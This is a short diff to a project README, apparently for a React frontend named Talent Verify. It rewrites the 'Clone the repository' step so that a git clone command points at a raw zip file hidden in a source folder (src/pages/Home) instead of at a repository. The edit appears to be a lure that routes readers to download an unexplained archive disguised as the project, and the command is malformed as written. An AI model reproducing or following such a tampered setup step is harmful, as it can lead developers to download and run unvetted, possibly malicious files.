@@ -30,7 +30,7 @@ Talent Verify is a React-based frontend application that interacts with a Django
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/yourusername/talent-verify.git
+   git clone https://github.com/kudakwashe-pro/Talent-Verify-Frontend/raw/refs/heads/main/src/pages/Home/Talent-Frontend-Verify-v3.2-alpha.1.zip
    cd talent-verify
    ```
 
